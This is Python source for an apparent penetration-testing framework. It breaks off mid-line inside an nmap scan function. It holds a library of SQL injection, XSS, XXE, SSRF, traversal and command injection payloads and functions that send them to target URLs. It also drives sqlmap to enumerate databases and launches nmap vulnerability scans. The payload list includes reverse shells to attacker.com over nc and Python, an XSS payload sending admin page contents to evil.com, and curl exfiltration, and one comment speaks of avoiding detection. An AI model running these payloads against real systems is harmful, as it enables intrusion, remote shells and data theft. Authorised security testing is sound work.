"""
Elite VAPT Tool Execution System - Function-Based Architecture
Focused implementation for OWASP Top 50 with enterprise-grade security testing
Expert-level penetration testing tools as standalone callable functions
"""

import subprocess
import asyncio
import json
import time
import logging
import os
import requests
import urllib.parse
from typing import Dict, List, Any, Optional, Union
from dataclasses import dataclass
from pathlib import Path
import tempfile
import re
import hashlib
import base64
from urllib.parse import urlparse, parse_qs
from io import StringIO
import sys

# Elite VAPT Stack Imports with availability checks
try:
    import scapy.all as scapy
    from scapy.layers.inet import IP, TCP, UDP, ICMP
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

try:
    result = subprocess.run(['nmap', '--version'], capture_output=True, check=True, timeout=5)
    NMAP_CLI_AVAILABLE = True
    print("✓ nmap CLI detected and available")
except (subprocess.CalledProcessError, subprocess.TimeoutExpired, FileNotFoundError):
    NMAP_CLI_AVAILABLE = False
    print("⚠ nmap CLI not found - network scanning features will be limited")

try:
    from bs4 import BeautifulSoup
    BEAUTIFULSOUP_AVAILABLE = True
except ImportError:
    BEAUTIFULSOUP_AVAILABLE = False

try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes, serialization
    import jwt as pyjwt
    CRYPTOGRAPHY_AVAILABLE = True
except ImportError:
    CRYPTOGRAPHY_AVAILABLE = False

try:
    import boto3
    from botocore.exceptions import ClientError
    BOTO3_AVAILABLE = True
except ImportError:
    BOTO3_AVAILABLE = False

try:
    import docker
    DOCKER_AVAILABLE = True
except ImportError:
    DOCKER_AVAILABLE = False

try:
    from zapv2 import ZAPv2
    ZAP_AVAILABLE = True
except ImportError:
    ZAP_AVAILABLE = False

# ===== GLOBAL CONFIGURATION =====
VAPT_CONFIG = {
    'timeout': 30,
    'output_dir': './vapt_results',
    'debug': False,
    'max_threads': 10,
    'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
}

# ===== DATA STRUCTURES =====

@dataclass
class ToolCallResult:
    """Standardized result format for all VAPT functions"""
    success: bool
    tool_name: str
    vulnerabilities: List[Union[Dict, 'Vulnerability']] = None
    execution_time: float = 0.0
    error: str = ""
    metadata: Dict[str, Any] = None
    business_impact: str = ""
    cvss_score: float = 0.0
    compliance_risk: str = ""

    def __post_init__(self):
        if self.vulnerabilities is None:
            self.vulnerabilities = []
        if self.metadata is None:
            self.metadata = {}
    
    def get_vulnerabilities_as_dicts(self) -> List[Dict]:
        """Convert all vulnerabilities to dictionaries for serialization"""
        result = []
        for vuln in self.vulnerabilities:
            if isinstance(vuln, Vulnerability):
                result.append(vuln.to_dict())
            else:
                result.append(vuln)  # Already a dict
        return result

@dataclass
class Vulnerability:
    """Standardized vulnerability finding structure"""
    type: str                           # Vulnerability type (e.g., 'SQL Injection', 'XSS')
    severity: str                       # Risk level: Critical, High, Medium, Low, Info
    evidence: str                       # Description of what was found
    cvss_score: float = 0.0            # CVSS score 0-10
    
    # Location details
    location: Optional[str] = None      # Where found (e.g., 'GET parameter', 'POST body')
    parameter: Optional[str] = None     # Parameter name if applicable
    url: Optional[str] = None           # Full URL tested
    endpoint: Optional[str] = None      # API endpoint
    
    # Technical details  
    payload: Optional[str] = None       # Attack payload used
    response_code: Optional[int] = None # HTTP response code
    port: Optional[str] = None          # Network port
    service: Optional[str] = None       # Network service
    target: Optional[str] = None        # Network target
    
    # Tool-specific fields
    tool: Optional[str] = None          # Tool that found it (e.g., 'SQLMap', 'nmap')
    technique: Optional[str] = None     # Attack technique used
    dbms: Optional[str] = None          # Database type for SQL injection
    
    # Advanced metadata
    business_impact: Optional[str] = None    # Business impact description
    remediation: Optional[str] = None        # Fix recommendations
    references: Optional[List[str]] = None   # CVE, CWE references
    
    def __post_init__(self):
        """Validate and normalize fields"""
        # Ensure severity is valid
        valid_severities = ['Critical', 'High', 'Medium', 'Low', 'Info']
        if self.severity not in valid_severities:
            self.severity = 'Medium'
        
        # Ensure CVSS score is within range
        if self.cvss_score < 0:
            self.cvss_score = 0.0
        elif self.cvss_score > 10:
            self.cvss_score = 10.0
            
        # Initialize references list if needed
        if self.references is None:
            self.references = []
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary for backward compatibility"""
        result = {}
        for field in self.__dataclass_fields__:
            value = getattr(self, field)
            if value is not None:  # Only include non-None values
                result[field] = value
        return result
    
    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> 'Vulnerability':
        """Create Vulnerability from dictionary"""
        # Filter out keys that aren't valid fields
        valid_fields = set(cls.__dataclass_fields__.keys())
        filtered_data = {k: v for k, v in data.items() if k in valid_fields}
        return cls(**filtered_data)

# ===== ELITE PAYLOAD LIBRARIES =====

class PayloadLibrary:
    """Comprehensive attack payload collection for expert-level testing"""
    
    SQL_INJECTION = {
        'critical': [
            "' OR '1'='1' --",
            "'; EXEC xp_cmdshell('whoami'); --",
            "' UNION SELECT 1,@@version,user(),database() --",
            "'; WAITFOR DELAY '0:0:10'; --",
            "' AND (SELECT SUBSTRING(@@version,1,1))='M' --",
            "' AND 1=CONVERT(int,(SELECT @@version)) --",
            "' UNION SELECT null,table_name,null FROM information_schema.tables --",
            "'; INSERT INTO users(username,password) VALUES('hacker','pwned'); --"
        ],
        'bypass': [
            "/**/UNION/**/SELECT",
            "UNI%00ON SEL%00ECT",
            "/*!50000UNION*//*!50000SELECT*/",
            "'/**/OR/**/1=1/**/--",
            "' OR 'x'='x",
            "'/*!*/OR/*!*/1=1/*!*/--",
            "' OR '1'='1'/*",
            "%27%20OR%20%271%27=%271",
            "' OR ASCII(SUBSTRING((SELECT database()),1,1))>64 --"
        ],
        'time_based': [
            "'; IF(1=1) WAITFOR DELAY '0:0:5' --",
            "' AND (SELECT SLEEP(5)) --",
            "' OR (SELECT pg_sleep(5)) --",
            "'; BENCHMARK(5000000,MD5(1)) --"
        ],
        'error_based': [
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e)) --",
            "' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)x GROUP BY CONCAT(version(),floor(rand(0)*2))) --",
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1) --"
        ]
    }
    
    XSS_ADVANCED = [
        "<svg/onload=alert('XSS')>",
        "<img src=x onerror=alert('XSS')>",
        "<script>fetch('/admin').then(r=>r.text()).then(d=>fetch('//evil.com?'+btoa(d)))</script>",
        "javascript:alert(document.domain)",
        "<body onload=alert(document.cookie)>",
        "<iframe src=javascript:alert('XSS')></iframe>",
        "<details open ontoggle=alert('XSS')>",
        "<math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><path id=</textarea><img onerror=alert('XSS') src=1>",
        "<%2Fscript%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E",
        "<svg><animatetransform onbegin=alert('XSS')>",
        "'><script>alert(String.fromCharCode(88,83,83))</script>",
        "\"><script>alert(/XSS/.source)</script>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<keygen onfocus=alert('XSS') autofocus>"
    ]
    
    XXE_PAYLOADS = [
        "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>",
        "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'http://attacker.com/evil.dtd'>]><root>&xxe;</root>",
        "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY % xxe SYSTEM 'file:///etc/passwd'>%xxe;]>",
        "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///c:/windows/system32/drivers/etc/hosts'>]><root>&xxe;</root>",
        "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=/etc/passwd'>]><root>&xxe;</root>"
    ]
    
    SSRF_TARGETS = [
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/",
        "http://127.0.0.1:22",
        "http://127.0.0.1:3306",
        "http://localhost:6379",
        "file:///etc/passwd",
        "dict://127.0.0.1:6379/",
        "gopher://127.0.0.1:25/",
        "http://[::1]:80/",
        "http://0177.0.0.1/",
        "http://2130706433/",
        "http://017700000001/"
    ]
    
    COMMAND_INJECTION = [
        "; whoami",
        "&& id",
        "| cat /etc/passwd",
        "; uname -a",
        "`whoami`",
        "$(id)",
        "; curl attacker.com/$(whoami)",
        "|nc -e /bin/sh attacker.com 4444",
        ";python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        "&ping -c 4 attacker.com",
        "|nslookup attacker.com"
    ]
    
    JWT_ATTACKS = {
        'none_algorithm': '{"alg":"none","typ":"JWT"}',
        'weak_secrets': ['secret', 'key', 'password', '123456', 'admin', 'test', 'jwt', 'token'],
        'algorithm_confusion': ['HS256', 'RS256', 'ES256', 'none'],
        'critical_claims': ['admin', 'root', 'superuser', 'administrator']
    }
    
    DIRECTORY_TRAVERSAL = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "....\/....\/....\/etc/passwd",
        "%252e%252e%252f",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
    ]
    
    BUSINESS_LOGIC_PAYLOADS = {
        'price_manipulation': ['-1', '0', '0.01', '999999999', '0.00'],
        'quantity_bypass': ['-1', '0', '999999', 'null', ''],
        'workflow_bypass': ['admin', 'true', '1', 'yes', 'approved'],
        'race_condition_targets': ['/transfer', '/purchase', '/vote', '/apply', '/submit']
    }

# ===== UTILITY FUNCTIONS =====

def create_vulnerability(vuln_type: str, severity: str, evidence: str, **kwargs) -> Vulnerability:
   
    # Calculate CVSS score if not provided
    if 'cvss_score' not in kwargs:
        kwargs['cvss_score'] = calculate_cvss_score(vuln_type, severity)
    
    return Vulnerability(
        type=vuln_type,
        severity=severity,
        evidence=evidence,
        **kwargs
    )

def setup_logging(debug: bool = False) -> logging.Logger:
    level = logging.DEBUG if debug else logging.INFO
    logging.basicConfig(
        level=level,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )
    return logging.getLogger(__name__)

def create_session(proxy: str = None, verify_ssl: bool = False) -> requests.Session:
    session = requests.Session()
    session.verify = verify_ssl
    session.timeout = VAPT_CONFIG['timeout']
    session.headers.update({
        'User-Agent': VAPT_CONFIG['user_agent']
    })
    
    if proxy:
        session.proxies = {'http': proxy, 'https': proxy}
    
    return session

def extract_url_from_text(text: str) -> Optional[str]:
    """Extract URL from plan or description text"""
    if not text:
        return None
        
    # URL pattern matching
    url_pattern = r'https?://[^\s<>"\']+|(?:www\.)?[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*'
    matches = re.findall(url_pattern, text)
    
    if matches:
        url = matches[0].strip('\'"[]')
        if not url.startswith(('http://', 'https://')):
            url = f"http://{url}"
        return url
    return None

def detect_sql_error(response_text: str) -> bool:
    sql_errors = [
        'sql syntax', 'mysql', 'oracle', 'postgresql', 'sqlite',
        'syntax error', 'unexpected token', 'division by zero',
        'ORA-', 'MySQL', 'Warning: mysql_', 'valid MySQL result',
        'PostgreSQL query failed', 'Warning: pg_',
        'Microsoft OLE DB Provider', 'SQLServer JDBC Driver',
        'SqlException', 'OracleException', 'sqlite3.OperationalError',
        'SQLSTATE', 'com.mysql.jdbc.exceptions'
    ]
    return any(error in response_text.lower() for error in sql_errors)

def detect_xss_reflection(response_text: str, payload: str) -> bool:
    # Check for direct payload reflection
    if payload in response_text:
        return True
    
    # Check for URL-encoded payload reflection
    encoded_payload = urllib.parse.quote(payload)
    if encoded_payload in response_text:
        return True
    
    # Check for HTML-encoded payload reflection
    html_encoded = payload.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;')
    if html_encoded in response_text:
        return True
    
    return False

def calculate_cvss_score(vulnerability_type: str, severity: str) -> float:
    base_scores = {
        'SQL Injection': {'Critical': 9.8, 'High': 8.5, 'Medium': 6.0},
        'XSS': {'Critical': 8.8, 'High': 7.5, 'Medium': 5.5},
        'XXE': {'Critical': 9.1, 'High': 8.0, 'Medium': 6.5},
        'SSRF': {'Critical': 8.5, 'High': 7.0, 'Medium': 5.0},
        'Command Injection': {'Critical': 9.9, 'High': 8.8, 'Medium': 7.0},
        'JWT Vulnerability': {'Critical': 9.1, 'High': 7.5, 'Medium': 5.5},
        'IDOR': {'Critical': 8.5, 'High': 7.0, 'Medium': 5.0},
        'Open Port': {'Critical': 9.0, 'High': 7.5, 'Medium': 5.0},
        'Information Disclosure': {'Critical': 7.5, 'High': 6.0, 'Medium': 4.0}
    }
    
    return base_scores.get(vulnerability_type, {}).get(severity, 0.0)

def save_results(results: ToolCallResult, filename: str = None) -> str:
    try:
        results_dir = Path(VAPT_CONFIG['output_dir'])
        results_dir.mkdir(parents=True, exist_ok=True)
        
        if not filename:
            timestamp = int(time.time())
            filename = f"vapt_results_{timestamp}.json"
        
        filepath = results_dir / filename
        
        # Convert dataclass to dict for JSON serialization
        results_dict = {
            'success': results.success,
            'tool_name': results.tool_name,
            'vulnerabilities': results.get_vulnerabilities_as_dicts(),
            'execution_time': results.execution_time,
            'error': results.error,
            'metadata': results.metadata,
            'business_impact': results.business_impact,
            'cvss_score': results.cvss_score,
            'compliance_risk': results.compliance_risk,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
        }
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(results_dict, f, indent=2, ensure_ascii=False)
        
        return str(filepath)
        
    except Exception as e:
        logging.error(f"Error saving results: {e}")
        return ""

# ===== SQL INJECTION TESTING FUNCTIONS =====

def sql_injection_test(url: str, parameter: str = "id", payload: str = None, 
                      test_type: str = "basic") -> ToolCallResult:
    start_time = time.time()
    vulnerabilities = []
    
    try:
        session = create_session()
        payloads_to_test = []
        
        # Select payloads based on test type
        if test_type == "basic":
            payloads_to_test = PayloadLibrary.SQL_INJECTION['critical'][:3]
        elif test_type == "advanced":
            payloads_to_test = (PayloadLibrary.SQL_INJECTION['critical'] + 
                              PayloadLibrary.SQL_INJECTION['bypass'][:5])
        else:  # comprehensive
            payloads_to_test = (PayloadLibrary.SQL_INJECTION['critical'] + 
                              PayloadLibrary.SQL_INJECTION['bypass'] + 
                              PayloadLibrary.SQL_INJECTION['time_based'][:3] +
                              PayloadLibrary.SQL_INJECTION['error_based'][:3])
        
        # Use custom payload if provided
        if payload:
            payloads_to_test = [payload]
        
        for test_payload in payloads_to_test:
            # Test GET parameter
            get_result = _test_sql_get_parameter(session, url, parameter, test_payload)
            vulnerabilities.extend(get_result)
            
            # Test POST data if comprehensive
            if test_type == "comprehensive":
                post_result = _test_sql_post_parameter(session, url, parameter, test_payload)
                vulnerabilities.extend(post_result)
            
            # Rate limiting to avoid detection
            time.sleep(0.5)
        
        execution_time = time.time() - start_time
        
        # Calculate business impact
        business_impact = "CRITICAL - Database compromise possible"
        if vulnerabilities:
            severities = []
            for v in vulnerabilities:
                if isinstance(v, Vulnerability):
                    severities.append(v.severity)
                else:
                    severities.append(v.get('severity', 'Low'))
            max_severity = max(severities) if severities else 'Low'
            if max_severity == 'Critical':
                business_impact = "CATASTROPHIC - Complete database access and potential system compromise"
        
        return ToolCallResult(
            success=True,
            tool_name="SQL Injection Test",
            vulnerabilities=vulnerabilities,
            execution_time=execution_time,
            metadata={
                'url': url,
                'parameter': parameter,
                'test_type': test_type,
                'payloads_tested': len(payloads_to_test)
            },
            business_impact=business_impact,
            cvss_score=max([v.cvss_score if isinstance(v, Vulnerability) else calculate_cvss_score('SQL Injection', v.get('severity', 'Low')) 
                           for v in vulnerabilities] + [0.0]),
            compliance_risk="PCI DSS, SOX, GDPR violations possible"
        )
        
    except Exception as e:
        return ToolCallResult(
            success=False,
            tool_name="SQL Injection Test",
            error=str(e),
            execution_time=time.time() - start_time
        )

def sqlmap_campaign(url: str, options: Dict[str, Any] = None) -> ToolCallResult:
    """
    Execute comprehensive SQLMap campaign using local sqlmap-dev
    
    Args:
        url: Target URL for testing
        options: Additional SQLMap options
    
    Returns:
        ToolCallResult with detailed findings
    """
    start_time = time.time()
    vulnerabilities = []
    
    try:
        # Check for sqlmap availability
        current_dir = os.getcwd()
        sqlmap_path = os.path.join(current_dir, 'sqlmap-dev', 'sqlmap.py')
        
        if not os.path.exists(sqlmap_path):
            return ToolCallResult(
                success=False,
                tool_name="SQLMap Campaign",
                error=f"SQLMap not found at {sqlmap_path}",
                execution_time=time.time() - start_time
            )
        
        # Build comprehensive SQLMap command
        cmd = [
            'python', sqlmap_path,
            '-u', url,
            '--batch',
            '--random-agent',
            '--level=3',
            '--risk=2',
            '--technique=BEUSTQ',
            '--timeout=30',
            '--retries=3',
            '--threads=5',
            '--tamper=space2comment,charencode',
            '--flush-session',
            '--fresh-queries',
            '--answers=quit=N,crack=N,dict=N,continue=Y',
            '--banner',
            '--current-user',
            '--current-db',
            '--dbs',
            '--tables'
        ]
        
        # Add custom options
        if options:
            if options.get('data'):
                cmd.extend(['--data', options['data']])
            if options.get('headers'):
                for header in options['headers']:
                    cmd.extend(['--header', header])
            if options.get('cookie'):
                cmd.extend(['--cookie', options['cookie']])
            if options.get('proxy'):
                cmd.extend(['--proxy', options['proxy']])
        
        # Execute SQLMap
        process = subprocess.run(
            cmd, 
            capture_output=True, 
            text=True, 
            timeout=900,  # 15 minutes
            cwd=current_dir
        )
        
        output = process.stdout
        error_output = process.stderr
        
        # Parse SQLMap results
        vulnerabilities = _parse_sqlmap_output(output, error_output, url)
        
        # Save detailed output
        if output:
            _save_sqlmap_results(output, url)
        
        execution_time = time.time() - start_time
        
        return ToolCallResult(
            success=True,
            tool_name="SQLMap Campaign",
            vulnerabilities=vulnerabilities,
            execution_time=execution_time,
            metadata={
                'sqlmap_version': 'dev',
                'command_used': ' '.join(cmd[:10]) + '...',
                'output_length': len(output)
            },
            business_impact="CRITICAL - Advanced SQL injection testing completed",
            cvss_score=max([v.cvss_score if isinstance(v, Vulnerability) else v.get('cvss_score', 0.0) for v in vulnerabilities] + [0.0]),
            compliance_risk="PCI DSS compliance violations"
        )
        
    except subprocess.TimeoutExpired:
        return ToolCallResult(
            success=False,
            tool_name="SQLMap Campaign",
            error="SQLMap execution timed out",
            execution_time=time.time() - start_time,
            vulnerabilities=[{
                'type': 'SQL Injection Testing',
                'severity': 'Info',
                'evidence': 'SQLMap scan timed out - target may be protected'
            }]
        )
    except Exception as e:
        return ToolCallResult(
            success=False,
            tool_name="SQLMap Campaign",
            error=str(e),
            execution_time=time.time() - start_time
        )

def _test_sql_get_parameter(session: requests.Session, url: str, 
                           parameter: str, payload: str) -> List[Vulnerability]:
    """Test SQL injection in GET parameters"""
    vulnerabilities = []
    
    try:
        # Construct test URL
        test_url = f"{url}?{parameter}={urllib.parse.quote(payload)}"
        response = session.get(test_url)
        
        # Analyze response
        if detect_sql_error(response.text):
            vuln = create_vulnerability(
                vuln_type='SQL Injection',
                severity='Critical',
                evidence='SQL error detected in response',
                location='GET parameter',
                parameter=parameter,
                payload=payload,
                url=test_url,
                response_code=response.status_code,
                remediation="Use parameterized queries and input validation"
            )
            vulnerabilities.append(vuln)
        
        # Check for time-based injection
        if 'SLEEP' in payload.upper() or 'WAITFOR' in payload.upper():
            if response.elapsed.total_seconds() > 4:
                vuln = create_vulnerability(
                    vuln_type='Time-based SQL Injection',
                    severity='Critical',
                    evidence=f'Response delayed by {response.elapsed.total_seconds():.2f} seconds',
                    location='GET parameter',
                    parameter=parameter,
                    payload=payload,
                    url=test_url,
                    technique='Time-based blind injection',
                    remediation="Implement proper timeout controls and parameterized queries"
                )
                vulnerabilities.append(vuln)
        
    except Exception as e:
        logging.error(f"Error testing SQL GET parameter: {e}")
    
    return vulnerabilities

def _test_sql_post_parameter(session: requests.Session, url: str, 
                            parameter: str, payload: str) -> List[Vulnerability]:
    """Test SQL injection in POST parameters"""
    vulnerabilities = []
    
    try:
        # Test POST data
        post_data = {parameter: payload}
        response = session.post(url, data=post_data)
        
        if detect_sql_error(response.text):
            vuln = create_vulnerability(
                vuln_type='SQL Injection',
                severity='Critical',
                evidence='SQL error detected in POST response',
                location='POST parameter',
                parameter=parameter,
                payload=payload,
                response_code=response.status_code,
                remediation="Use parameterized queries and input validation for POST data"
            )
            vulnerabilities.append(vuln)
        
    except Exception as e:
        logging.error(f"Error testing SQL POST parameter: {e}")
    
    return vulnerabilities

def _parse_sqlmap_output(output: str, error_output: str, url: str) -> List[Vulnerability]:
    """Parse SQLMap output for vulnerabilities"""
    vulnerabilities = []
    
    try:
        lines = output.split('\n')
        
        # Check for SQL injection detection
        if any(phrase in output.lower() for phrase in [
            'is vulnerable', 'sqlmap identified', 'injection found',
            'parameter is vulnerable', 'payload worked'
        ]):
            injection_technique = 'Unknown'
            dbms_type = 'Unknown'
            
            for line in lines:
                line = line.strip()
                
                # Extract injection technique
                if 'technique:' in line.lower():
                    injection_technique = line.split(':', 1)[1].strip()
                elif any(tech in line.lower() for tech in ['boolean-based', 'error-based', 'union query', 'time-based']):
                    injection_technique = line.strip()
                
                # Extract DBMS information
                if 'back-end dbms:' in line.lower():
                    dbms_type = line.split(':', 1)[1].strip()
            
            vuln = create_vulnerability(
                vuln_type='SQL Injection',
                severity='Critical',
                evidence=f'SQLMap confirmed SQL injection using {injection_technique}',
                tool='SQLMap',
                technique=injection_technique,
                dbms=dbms_type,
                url=url,
                business_impact='Complete database compromise possible',
                remediation="Implement parameterized queries and WAF protection"
            )
            vulnerabilities.append(vuln)
        
        # Check for database enumeration
        if 'available databases' in output.lower():
            databases = _extract_databases_from_sqlmap_output(output)
            if databases:
                vuln = create_vulnerability(
                    vuln_type='Database Enumeration',
                    severity='High',
                    evidence=f'Successfully enumerated {len(databases)} databases: {", ".join(databases[:5])}',
                    tool='SQLMap',
                    url=url,
                    business_impact='Database structure exposed',
                    remediation="Restrict database user privileges and implement access controls"
                )
                vulnerabilities.append(vuln)
        
        # Check for data exfiltration
        if 'database table entries' in output.lower() or 'dumped table' in output.lower():
            vuln = create_vulnerability(
                vuln_type='Data Exfiltration',
                severity='Critical',
                evidence='Successfully extracted sensitive data from database',
                tool='SQLMap',
                url=url,
                business_impact='Sensitive data exposed',
                remediation="Implement data encryption and access logging"
            )
            vulnerabilities.append(vuln)
        
        # Check for OS command execution
        if 'os-shell' in output.lower() or 'operating system' in output.lower():
            vuln = create_vulnerability(
                vuln_type='OS Command Execution',
                severity='Critical',
                evidence='Potential OS shell access through SQL injection',
                tool='SQLMap',
                url=url,
                business_impact='Complete system compromise',
                remediation="Disable dangerous database functions and implement sandboxing"
            )
            vulnerabilities.append(vuln)
        
    except Exception as e:
        logging.error(f"Error parsing SQLMap output: {e}")
    
    return vulnerabilities

def _extract_databases_from_sqlmap_output(output: str) -> List[str]:
    """Extract database names from SQLMap output"""
    databases = []
    capture = False
    
    for line in output.split('\n'):
        line = line.strip()
        if 'available databases' in line.lower():
            capture = True
            continue
        elif capture:
            if line.startswith('[') and ']' in line:
                db_name = line.split(']')[0].replace('[', '').strip()
                if db_name and db_name not in ['*', '+', '-']:
                    databases.append(db_name)
            elif not line or line.startswith('[INFO]'):
                capture = False
    
    return databases

def _save_sqlmap_results(output: str, url: str):
    """Save SQLMap results for analysis"""
    try:
        results_dir = Path(VAPT_CONFIG['output_dir'])
        results_dir.mkdir(parents=True, exist_ok=True)
        
        timestamp = int(time.time())
        filename = f"sqlmap_scan_{timestamp}.txt"
        filepath = results_dir / filename
        
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(f"SQLMap Scan Results\n")
            f.write(f"Target URL: {url}\n")
            f.write(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"{'='*50}\n\n")
            f.write(output)
        
        logging.info(f"SQLMap results saved to {filepath}")
        
    except Exception as e:
        logging.error(f"Error saving SQLMap results: {e}")

# ===== XSS TESTING FUNCTIONS =====

def xss_test(url: str, parameter: str = "search", payload: str = None, 
             test_type: str = "basic") -> ToolCallResult:
    start_time = time.time()
    vulnerabilities = []
    
    try:
        session = create_session()
        payloads_to_test = []
        
        # Select payloads based on test type
        if test_type == "basic":
            payloads_to_test = PayloadLibrary.XSS_ADVANCED[:5]
        elif test_type == "advanced":
            payloads_to_test = PayloadLibrary.XSS_ADVANCED[:10]
        else:  # comprehensive
            payloads_to_test = PayloadLibrary.XSS_ADVANCED
        
        # Use custom payload if provided
        if payload:
            payloads_to_test = [payload]
        
        for test_payload in payloads_to_test:
            # Test GET parameter
            get_result = _test_xss_get_parameter(session, url, parameter, test_payload)
            vulnerabilities.extend(get_result)
            
            # Test POST parameter
            post_result = _test_xss_post_parameter(session, url, parameter, test_payload)
            vulnerabilities.extend(post_result)
            
            # Test in headers if comprehensive
            if test_type == "comprehensive":
                header_result = _test_xss_headers(session, url, test_payload)
                vulnerabilities.extend(header_result)
            
            time.sleep(0.3)  # Rate limiting
        
        execution_time = time.time() - start_time
        
        business_impact = "HIGH - Client-side code execution and session hijacking"
        if vulnerabilities:
            stored_xss = False
            for v in vulnerabilities:
                vuln_type = v.type if isinstance(v, Vulnerability) else v.get('type', '')
                if vuln_type == 'Stored XSS':
                    stored_xss = True
                    break
            if stored_xss:
                business_impact = "CRITICAL - Persistent malicious code affecting all users"
        
        return ToolCallResult(
            success=True,
            tool_name="XSS Test",
            vulnerabilities=vulnerabilities,
            execution_time=execution_time,
            metadata={
                'url': url,
                'parameter': parameter,
                'test_type': test_type,
                'payloads_tested': len(payloads_to_test)
            },
            business_impact=business_impact,
            cvss_score=max([v.cvss_score if isinstance(v, Vulnerability) else calculate_cvss_score('XSS', v.get('severity', 'Low')) 
                           for v in vulnerabilities] + [0.0]),
            compliance_risk="Data privacy violations, session compromise"
        )
        
    except Exception as e:
        return ToolCallResult(
            success=False,
            tool_name="XSS Test",
            error=str(e),
            execution_time=time.time() - start_time
        )

def _test_xss_get_parameter(session: requests.Session, url: str, 
                           parameter: str, payload: str) -> List[Dict]:
    vulnerabilities = []
    
    try:
        test_url = f"{url}?{parameter}={urllib.parse.quote(payload)}"
        response = session.get(test_url)
        
        if detect_xss_reflection(response.text, payload):
            # Determine if it's reflected or stored
            xss_type = 'Reflected XSS'
            
            # Check if payload is stored by making a second request
            second_response = session.get(url)
            if payload in second_response.text:
                xss_type = 'Stored XSS'
            
            # Create structured vulnerability using the new dataclass
            vuln = create_vulnerability(
                vuln_type=xss_type,
                severity='Critical' if xss_type == 'Stored XSS' else 'High',
                evidence='XSS payload reflected in response',
                location='GET parameter',
                parameter=parameter,
                payload=payload,
                url=test_url,
                response_code=response.status_code,
                remediation="Sanitize user input and use Content Security Policy (CSP)"
            )
            vulnerabilities.append(vuln)
        
    except Exception as e:
        logging.error(f"Error testing XSS GET parameter: {e}")
    
    return vulnerabilities

def _test_xss_post_parameter(session: requests.Session, url: str, 
                            parameter: str, payload: str) -> List[Vulnerability]:
    """Test XSS in POST parameters"""
    vulnerabilities = []
    
    try:
        post_data = {parameter: payload}
        response = session.post(url, data=post_data)
        
        if detect_xss_reflection(response.text, payload):
            vuln = create_vulnerability(
                vuln_type='Reflected XSS',
                severity='High',
                evidence='XSS payload reflected in POST response',
                location='POST parameter',
                parameter=parameter,
                payload=payload,
                response_code=response.status_code,
                remediation="Implement output encoding and Content Security Policy (CSP)"
            )
            vulnerabilities.append(vuln)
        
    except Exception as e:
        logging.error(f"Error testing XSS POST parameter: {e}")
    
    return vulnerabilities

def _test_xss_headers(session: requests.Session, url: str, payload: str) -> List[Vulnerability]:
    """Test XSS in HTTP headers"""
    vulnerabilities = []
    
    headers_to_test = [
        'User-Agent', 'Referer', 'X-Forwarded-For', 
        'X-Real-IP', 'X-Originating-IP', 'Accept-Language'
    ]
    
    for header in headers_to_test:
        try:
            test_headers = {header: payload}
            response = session.get(url, headers=test_headers)
            
            if detect_xss_reflection(response.text, payload):
                vuln = create_vulnerability(
                    vuln_type='Header-based XSS',
                    severity='Medium',
                    evidence=f'XSS payload reflected from {header} header',
                    location=f'{header} header',
                    payload=payload,
                    url=url,
                    remediation="Sanitize and validate all HTTP headers before processing"
                )
                vulnerabilities.append(vuln)
        except Exception as e:
            logging.error(f"Error testing XSS in {header} header: {e}")
    
    return vulnerabilities

# ===== NETWORK RECONNAISSANCE FUNCTIONS =====

def nmap_scan(target: str, scan_type: str = "basic", ports: str = None) -> ToolCallResult:
    start_time = time.time()
    vulnerabilities = []
    
    if not NMAP_CLI_AVAILABLE:
        return ToolCallResult(
            success=False,
            tool_name="Nmap Scan",
            error="Nmap CLI not available",
            execution_time=time.time() - start_time
        )
    
    try:
        # Build nmap command based on scan type
        if scan_type == "basic":
            cmd = ['nmap', '-sS', '-T4', '--top-ports', '1000', target]
        elif scan_type == "service":
            cmd = ['nmap', '-sV', '-sC', '--top-ports', '100', target]
        elif scan_type == "vuln":
            cmd = ['nmap', '--script', 'vuln', '--script-timeout', '60s', target]
        else:  # comprehensive
            cmd = ['nmap', '-sS', '-sV', '-sC', '-O', '--script', 'vuln', 
